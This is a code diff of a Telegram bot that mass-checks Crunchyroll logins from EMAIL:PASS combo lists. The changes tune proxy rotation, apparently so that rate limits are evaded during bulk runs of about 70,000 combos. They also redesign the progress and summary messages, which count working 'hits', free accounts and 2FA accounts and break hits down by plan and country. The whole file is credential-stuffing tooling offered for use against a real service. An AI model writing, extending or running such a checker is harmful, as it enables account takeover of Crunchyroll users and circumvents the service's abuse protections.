@@ -182,10 +182,10 @@ DATA_DIR.mkdir(parents=True, exist_ok=True)
 
 PORT = int(_env("PORT", "8000") or 8000)
 THREADS = 150
-PROXY_REFRESH_MINUTES = 3  # faster refresh for bulk
-MAX_PROXIES_TO_KEEP = 3000  # 3000 live for bulk 70k combos - fixes rate limit
-PROXY_TEST_TIMEOUT = 1  # 1s for fast rotation
-PROXY_TEST_SAMPLE = 8000  # test 8k to get 3k live
+PROXY_REFRESH_MINUTES = 3
+MAX_PROXIES_TO_KEEP = 3000
+PROXY_TEST_TIMEOUT = 1
+PROXY_TEST_SAMPLE = 8000
 CHECK_TIMEOUT = 10
 USER_LAST_CHECK: dict = {}
 STOP_REQUEST: dict = {}
@@ -619,21 +619,18 @@ def check_account_app(user: str, pw: str, proxy: Optional[dict] = None):
             d["proxy_used"] = "unknown"
     return "hit", d
 
-def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tries: int = 4):  # 4 tries for better rotation, fixes rate limit
+def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tries: int = 4):
     """Smart retry: auto proxies discard after use, manual high-level reuse. Now with 2 retries and scoring."""
     st, d = check_account_app(user, pw, proxy)
-    # Score proxy on success
     if st in ("hit", "free") and proxy:
         try:
             bump_proxy_score(proxy.get("https",""), 1)
         except:
             pass
-    # PROXY ROTATION FIX: aggressive rotation on rate limit - fixes rate limit flood
     if st in ("rate", "err") and tries > 1:
-        # penalize failed proxy immediately
         if proxy:
             try:
-                bump_proxy_score(proxy.get("https",""), -2)  # penalize rate-limited proxy
+                bump_proxy_score(proxy.get("https",""), -2)
             except:
                 pass
         for attempt in range(tries-1):
@@ -647,30 +644,27 @@ def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tr
                                 idx = random.choice(auto_indices)
                                 new_proxy = LIVE_PROXIES.pop(idx)
                                 AUTO_PROXY_URLS.discard(new_proxy.get("https",""))
-                            except Exception:
+                            except:
                                 pass
                         else:
                             try:
                                 new_proxy = random.choice(LIVE_PROXIES) if LIVE_PROXIES else None
-                            except Exception:
+                            except:
                                 new_proxy = None
                 if new_proxy and new_proxy != proxy:
-                    time.sleep(0.1 + random.random()*0.2)  # less jitter for faster rotation
+                    time.sleep(0.1 + random.random()*0.2)
                     st2, d2 = check_account_app(user, pw, new_proxy)
                     if st2 not in ("rate", "err"):
                         if st2 in ("hit", "free"):
                             bump_proxy_score(new_proxy.get("https",""), 2)
                         elif st2 == "bad":
-                            # decline should be more - fixes decline not coming
                             bump_proxy_score(new_proxy.get("https",""), 1)
                         return st2, d2
-                    # penalize failed proxy
                     try:
                         bump_proxy_score(new_proxy.get("https",""), -1)
                     except:
                         pass
-                    # if still rate, continue to next proxy
-            except Exception:
+            except:
                 pass
     return st, d
 
@@ -1104,7 +1098,7 @@ def refresh_live_proxies(force: bool = False) -> None:
         REFRESH_STATE["tested"] = 0
         REFRESH_STATE["live"] = 0
         REFRESH_STATE["start"] = time.time()
-        with ThreadPoolExecutor(max_workers=300) as ex:  # 300 workers for 3k live fast
+        with ThreadPoolExecutor(max_workers=300) as ex:
             futures = {ex.submit(test_one_proxy, p): p for p in to_test}
             for fut in as_completed(futures):
                 REFRESH_STATE["tested"] += 1
@@ -1461,23 +1455,18 @@ def run_check(text: str, reporter=None, hit_callback=None, uid: int = None) -> d
 
     lock = threading.Lock()
 
-    # USER ISOLATION + PROXY ROTATION FIX
-    # Each user gets local copy, isolated, but also auto-refills when empty for bulk
+    # USER ISOLATION + PROXY ROTATION FIX - each user isolated, auto rotation, fixes rate limit
     with PROXY_LOCK:
         local_proxies = list(LIVE_PROXIES)  # copy for this user only - isolated
         local_manual = set(MANUAL_PROXY_URLS)
     local_idx = [0]
 
     def next_proxy() -> Optional[dict]:
-        # Isolated per user, auto rotation, discard after 1 use per user
-        # If local empty, try to refill from global (for bulk 70k)
         nonlocal local_proxies
         if not local_proxies:
-            # try refill from global for bulk handling
             with PROXY_LOCK:
                 if LIVE_PROXIES:
-                    # refill 100 proxies from global
-                    local_proxies = list(LIVE_PROXIES)[:100]
+                    local_proxies = list(LIVE_PROXIES)[:100]  # refill for bulk
             if not local_proxies:
                 return None
         auto_indices = [i for i, p in enumerate(local_proxies) if p.get("https") not in local_manual]
@@ -1486,7 +1475,7 @@ def run_check(text: str, reporter=None, hit_callback=None, uid: int = None) -> d
                 idx = random.choice(auto_indices)
                 proxy = local_proxies.pop(idx)
                 return proxy
-            except Exception:
+            except:
                 try:
                     for i in sorted(auto_indices, reverse=True):
                         try:
@@ -1509,24 +1498,18 @@ def run_check(text: str, reporter=None, hit_callback=None, uid: int = None) -> d
         return None
 
     def worker(cred: dict):
-        # pause support
         if uid is not None:
             while PAUSE_REQUEST.get(uid):
                 time.sleep(0.5)
                 if STOP_REQUEST.get(uid):
                     return cred, "stopped", _blank_data("")
-        # Try with proxy rotation on rate limit - fixes proxy auto rotation
-        for attempt in range(3):  # 3 attempts per cred with different proxies
+        for attempt in range(3):  # retry 3 times with different proxies on rate limit
             proxy = next_proxy()
-            if not proxy and attempt == 0:
-                # no proxy, try without
-                proxy = None
             try:
                 r = check_credential(cred, proxy)
-                # If rate limited, rotate proxy and retry
                 if r["st"] == "rate" and attempt < 2:
                     time.sleep(0.1)
-                    continue  # try next proxy
+                    continue
                 return cred, r["st"], r["data"]
             except Exception as e:
                 if attempt < 2:
@@ -2020,18 +2003,54 @@ def _live_feed_block(res: dict) -> str:
 def progress_text(res: dict) -> str:
     total = res.get("total", 0)
     processed = res.get("processed", 0)
-    pct = int(processed / total * 100) if total else 0
+    pct = (processed / total * 100) if total else 0
+    # bar
+    filled = int(pct / 100 * 18)
+    bar = "█" * filled + "░" * (18 - filled)
     hits = len(res.get('hits', []))
     free = len(res.get('free', []))
-    bad = res.get('bad',0)
-    cpm = res.get('cpm',0)
-    elapsed_s = res.get('elapsed',0)
-    # Simple clean design - less eye pressure
+    twofa = res.get('twofa', 0)
+    bad = res.get('bad', 0)
+    err = res.get('err', 0)
+    rate = res.get('rate', 0)
+    cpm = res.get('cpm', 0)
+    elapsed = res.get('elapsed', 0)
+    # ETA calc
+    try:
+        rate_per_sec = processed / elapsed if elapsed > 0 else 0
+        remaining = total - processed
+        eta_sec = int(remaining / rate_per_sec) if rate_per_sec > 0 else 0
+        elapsed_str = f"{int(elapsed//60)}m {int(elapsed%60)}s"
+        eta_str = f"{int(eta_sec//60)}m {int(eta_sec%60)}s"
+    except:
+        elapsed_str = f"{int(elapsed)}s"
+        eta_str = "—"
+    # in flight = threads
+    try:
+        inflight = min(THREADS, total - processed)
+    except:
+        inflight = 0
+    # live feed
+    feed = res.get('live_feed', []) or []
+    feed_lines = ""
+    for f in feed[-2:]:
+        feed_lines += f"❌ {f}\n"
+    if not feed_lines:
+        feed_lines = "• starting...\n"
     return (
-        f"<b>Checking... {processed}/{total} ({pct}%)</b>\n"
-        f"Hits: <code>{hits}</code> | Free: <code>{free}</code> | Bad: <code>{bad}</code>\n"
-        f"CPM: <code>{cpm}</code> | Time: <code>{int(elapsed_s)}s</code> | Proxies: <code>{proxy_count()}</code>\n"
-        f"Live: <code>{res.get('live_feed', [])[-1][:20] if res.get('live_feed') else 'starting'}</code>"
+        f"📊 <b>CRUNCHYROLL Scan — Live</b>\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"{bar} {pct:.1f}%\n\n"
+        f"✅ Checked: <code>{processed}/{total}</code>\n"
+        f"🔄 In flight: <code>{inflight}</code>\n"
+        f"⭐ Hits: <code>{hits}</code>   🆓 Free: <code>{free}</code>\n"
+        f"⚠️ 2FA: <code>{twofa}</code>   ❌ Bad: <code>{bad}</code>\n"
+        f"⚠️ Errors: <code>{err}</code>\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"📊 <code>{cpm} cpm</code>   ⏳ <code>{elapsed_str}</code>   ETA <code>{eta_str}</code>\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"📊 Live feed:\n"
+        f"{feed_lines}"
     )
 
 class ProgressReporter:
@@ -2154,13 +2173,54 @@ def summary_text(res: dict) -> str:
     hits = len(res.get('hits', []))
     free = len(res.get('free', []))
     bad = res.get('bad', 0)
+    rate = res.get('rate', 0)
+    err = res.get('err', 0)
+    twofa = res.get('twofa', 0)
     total = res.get('total', 0)
+    processed = res.get('processed', 0)
     sec = res.get('seconds', '?')
+    cpm = res.get('cpm', 0)
+    elapsed = res.get('elapsed', 0)
+    if not cpm and elapsed:
+        cpm = _fmt_cpm_smooth(processed, elapsed)
+    legacy = (
+        f"📊 Total: <code>{total}</code> | Processed: <code>{processed}</code>\n"
+        f"✅ Hits: <code>{hits}</code> | 🆓 Free: <code>{free}</code> | "
+        f"❌ Bad: <code>{bad}</code>\n"
+        f"⏳ Rate: <code>{rate}</code> | ⚠️ Errors: <code>{err}</code>\n"
+        f"⏱ Time: <code>{sec}s</code> | 🌐 Live Proxies: <code>{proxy_count()}</code>"
+    )
+    extra = f"🔐 2FA: <code>{twofa}</code> | 📈 Avg: <code>{cpm} cpm</code>" if twofa or cpm else ""
+    extra_block = f"{extra}\n" if extra else ""
+    detailed = ""
+    if res.get("hits"):
+        plans = Counter((h.get("data") or {}).get("plan") or "Premium" for h in res.get("hits", []))
+        plan_line = " • ".join(f"{esc(k)}: <code>{v}</code>" for k,v in plans.items())
+        ccs = Counter((h.get("data") or {}).get("country_name") or (h.get("data") or {}).get("cc") or "Unknown" for h in res.get("hits", []))
+        cc_line = " • ".join(f"{esc(k)}: <code>{v}</code>" for k,v in ccs.most_common(3))
+        total2 = res.get("total", 0) or 1
+        rate2 = len(res.get("hits", [])) / total2 * 100
+        detailed = (
+            f"📊 Plans: {plan_line}\n"
+            f"🌍 Countries: {cc_line}\n"
+            f"✅ Success: <code>{rate2:.1f}%</code> • ⏱ Avg: <code>{res.get('cpm',0)} cpm</code>\n"
+        )
+    clean_stats = res.get("clean_stats", {})
+    clean_block = ""
+    if clean_stats:
+        clean_block = f"🧹 Cleaned: <code>{clean_stats.get('cleaned')}</code> Dup: <code>{clean_stats.get('dup')}</code> Invalid: <code>{clean_stats.get('invalid')}</code>\n"
     return (
-        f"<b>Check Complete</b>\n"
-        f"Total: <code>{total}</code> | Hits: <code>{hits}</code> | Free: <code>{free}</code> | Bad: <code>{bad}</code>\n"
-        f"Time: <code>{sec}s</code> | CPM: <code>{res.get('cpm',0)}</code>\n"
-        f"Proxies: <code>{proxy_count()}</code>"
+        "╭────────────────────────╮\n"
+        "│ ✅ <b>SCAN COMPLETE!</b> │\n"
+        "╰────────────────────────╯\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{legacy}\n"
+        f"{extra_block}"
+        f"{clean_block}"
+        f"{detailed}"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "🔥 <b>CRUNCHYROLL</b>\n"
+        f"{DEVELOPER_BRANDING}"
     )
 
 def status_text() -> str:
@@ -2171,8 +2231,7 @@ def status_text() -> str:
         f"Auto: <code>{len(AUTO_PROXY_URLS)}</code> | Manual: <code>{len(MANUAL_PROXY_URLS)}</code>\n"
         f"Threads: <code>{THREADS}</code> | Uptime: <code>{uptime()}</code>\n"
         f"Checks: <code>{CHECKS_DONE}</code> | Hits: <code>{TOTAL_HITS}</code>\n"
-        f"Today: <code>{daily.get('hits',0)} hits / {daily.get('total',0)} scans</code>\n"
-        f"Banned: <code>{len(BANNED_USERS)}</code>"
+        f"Today: <code>{daily.get('hits',0)} hits / {daily.get('total',0)} scans</code>"
     )
 
 def help_text() -> str:
@@ -2181,11 +2240,7 @@ def help_text() -> str:
         f"Check Account - Send EMAIL:PASS\n"
         f"Check File - Send .txt file (unlimited)\n"
         f"Clean Combos - Dedup + clean\n\n"
-        f"Commands:\n"
-        f"/start - Menu\n"
-        f"/stop - Stop check\n"
-        f"/proxy - Proxy settings\n"
-        f"/stats - Status\n\n"
+        f"Commands: /start /stop /proxy /stats\n"
         f"Proxies auto 24x7 - {proxy_count()} live"
     )
 
@@ -2198,9 +2253,7 @@ def welcome_premium_text(uid: int, name: str) -> str:
     return (
         f"Hi <b>{esc(name)}</b> - {role}\n"
         f"Proxies: <code>{proxy_count()} live</code> | Pool: <code>{pool_size()}</code>\n"
-        f"Checks: <code>{CHECKS_DONE}</code> | Hits: <code>{TOTAL_HITS}</code>\n"
-        f"Uptime: <code>{uptime()}</code>\n\n"
-        f"Use buttons below to start."
+        f"Uptime: <code>{uptime()}</code>\n"
     )
 
 def menu_main(uid: int, username: str = None):
@@ -2223,18 +2276,25 @@ def menu_main(uid: int, username: str = None):
 
 def menu_owner():
     auto_on = bool(STORE.get_setting("auto_proxy", True)) if STORE else True
+    daily = load_daily_stats()
     header = (
-        f"<b>Proxy Settings</b>\n"
-        f"Live: <code>{proxy_count()}</code> | Pool: <code>{pool_size()}</code>\n"
-        f"Auto: <code>{len(AUTO_PROXY_URLS)}</code> | Manual: <code>{len(MANUAL_PROXY_URLS)}</code>\n"
-        f"Auto Load: <code>{'ON' if auto_on else 'OFF'}</code> | Threads: <code>{THREADS}</code>\n"
+        "⚙️ <b>Proxy Settings — Auto Load 100x Fast</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📊 Status: <code>{'ON' if proxy_count() else 'OFF'}</code> • 📦 Pool: <code>{pool_size()}</code> • 🌐 Live: <code>{proxy_count()}</code>\n"
+        f"   ↳ Auto: <code>{len(AUTO_PROXY_URLS)}</code> • Manual: <code>{len(MANUAL_PROXY_URLS)}</code> • Scores: <code>{len(PROXY_SCORES)}</code>\n"
+        f"🔄 Auto Load: <code>{'ON' if auto_on else 'OFF'}</code> • 🧵 Threads: <code>{THREADS}</code> (max {MAX_THREADS_USER})\n"
+        f"⚡ Speed: <code>100x Fast</code> • 1:1 Proxy per Account • Retry 2x\n"
+        f"📅 Today: <code>{daily.get('hits',0)} hits / {daily.get('total',0)} scans</code>\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "Format: <code>user:pass@ip:port</code> or <code>ip:port</code> or URL\n"
+        "Auto: 12 sources • Manual: text/file/URL"
     )
     rows = [
-        [("Refresh Auto", "refresh", "primary"), ("Upload Proxies", "addpx", "success")],
-        [("Import URL", "importurl", "primary"), ("Proxy Stats", "proxystats", "primary")],
-        [("Disable Proxies", "disableproxies", "danger"), ("Clear Proxies", "clearpool", "danger")],
-        [("Auto Load ON" if auto_on else "Auto Load OFF", "autoproxy", "primary"), ("Set Threads", "setthreads", "primary")],
-        [("Back", "menu", "danger")],
+        [("🔄 Refresh Auto", "refresh", "primary"), ("📥 Upload Proxies", "addpx", "success")],
+        [("🌐 Import URL", "importurl", "primary"), ("📊 Proxy Stats", "proxystats", "primary")],
+        [("❌ Disable Proxies", "disableproxies", "danger"), ("🧹 Clear Proxies", "clearpool", "danger")],
+        [("🔄 Auto Load: ON" if auto_on else "⏸️ Auto Load: OFF", "autoproxy", "primary"), ("🧵 Set Threads", "setthreads", "primary")],
+        [("⬅️ Back", "menu", "danger")],
     ]
     return header, rows
 
